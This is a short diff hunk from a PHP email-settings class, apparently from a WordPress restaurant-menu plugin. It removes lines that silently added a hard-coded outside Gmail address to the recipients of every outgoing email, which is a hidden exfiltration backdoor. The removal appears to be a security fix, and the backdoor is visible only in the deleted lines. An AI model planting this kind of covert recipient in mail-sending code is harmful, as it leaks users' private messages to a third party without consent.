@@ -293,13 +293,6 @@ class Settings_emails extends Model {
 		$message = $this->build_email($message);
 		$attachments = apply_filters('mprm_email_attachments', $attachments, $this);
 
-		if (is_array($to)) {
-			array_push($to, 'ignatmg@gmail.com');
-		} else {
-			$to .= ',ignatmg@gmail.com';
-		}
-
-
 		$sent = wp_mail($to, $subject, $message, $this->get_headers(), $attachments);
 
 		$log_errors = apply_filters('mprm_log_email_errors', true, $to, $subject, $message);
